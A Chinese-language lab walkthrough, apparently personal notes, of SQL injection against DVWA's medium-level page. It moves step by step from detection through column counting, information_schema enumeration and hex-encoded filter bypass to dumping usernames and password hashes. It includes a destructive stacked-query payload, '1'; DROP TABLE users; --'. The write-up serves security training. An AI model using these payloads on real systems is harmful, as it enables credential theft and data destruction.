# 第一步：检测与服务器交互位置

进来页面，啥都没有

与服务器交互的东西都没没看到，就一个写好了的提交按钮。url也变成的post.

原本的样子：

<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_044542.png" style="zoom:50%;" />

借助工具看一下内容咯：

![20240914_045128](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_045128.png)



# 第二步：探测是否存在漏洞

## 方法1：基于布尔的盲注检测（and or || &）



### 检测数字类型（基于1=2错误类型的报错，说明是存在漏洞）

```
1 and 1 = 1
1 and 1 = 2
```

<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_050859.png" alt="20240914_050859" style="zoom:67%;" />





### 检测字符串类型（语法报错，由于 ' 转义了，无法判断）

```
'
"
```



![20240914_064909](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_064909.png)

![20240914_065155](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_065155.png)

## 方法2：基于报错的检测方法（有错误返回）

![20240914_064909](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_064909.png)



## 方法3：基于UNION联合查询的检测

```
union select 1 #
```

<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_051850.png" alt="20240914_051850" style="zoom:67%;" />

## 方法4: 基于时间的盲测的检测（时间函数sleep）

```
'and (select * from (select(sleep(20)))a)--+
```

<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_052130.png" alt="20240914_052130" style="zoom:50%;" />

## 方法5:基于叠对查询的检测（；）

使用";"结束前面的语句，自己在写一个查询语句。

```
1'; DROP TABLE users; -- 
```

![20240914_052453](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_052453.png)

# 第三步：推测后台查询语句

```sql
由于没有探测出闭合类型：
select * from table where id =;
select * from table where id ='';
select * from table where id ="";

id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)&Submit=Submit
```



# 第四步：查询显示位

## 方式1：根据排序order by 数字类型(数字类型的注入)：

```
直接执行了我们的语句，确定是，数字类型的注入
1 order by 2%23
1 order by 3%23

根据查询在第二列与第三列之前的存在错误的临界点，说明最大显示位位第二列
```

![20240914_070925](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_070925.png)

![20240914_071418](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_071418.png)

## 方式2：根据联合查询：union select

```sql
根据第1列进行联合显示列数查询
1 union select 1%23
1 union select 1,2%23
列数不断增加，显示为一共为2列
```

![20240914_071908](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_071908.png)

![20240914_072139](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072139.png)



# 第五步：根据显示位，查询各种数据库函数。

数据库版本version()

```
id=1 union select 1, version() %23
```

![20240914_072541](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072541.png)



查询当前数据库名称 database()

```
1 union select 1,database() %23
```

![20240914_072859](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072859.png)



# 第六步：尝试查询源数据库内容 information_schema。

## 查询当前数据库的表名称

```
1 union select 1, group_concat(table_name) from information_schema.tables where table_schema = database() %23
```

![20240914_073941](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_073941.png)



## 查询源数据库的所有表

```sql
1 union select (table_name collate utf8_unicode_ci),(table_schema collate utf8_unicode_ci) from information_schema.tables %23
```

![20240914_075533](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_075533.png)



## 统计源数据库的数据库表数量

![20240914_075119](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_075119.png)



# 第七步：根据数据名称与表名称查询字段名称

```sql
由于过滤了单双引号，用十六进制绕过

1 union select 1, group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 0x7573657273 %23
```

![20240914_084227](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_084227.png)



# 第八步：获取数据表字段内容

```sql
1 union select 1, concat_ws(':',user_id,first_name,last_name,user,password,avatar,last_login,failed_login) from users %23
```

![20240914_084843](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_084843.png)



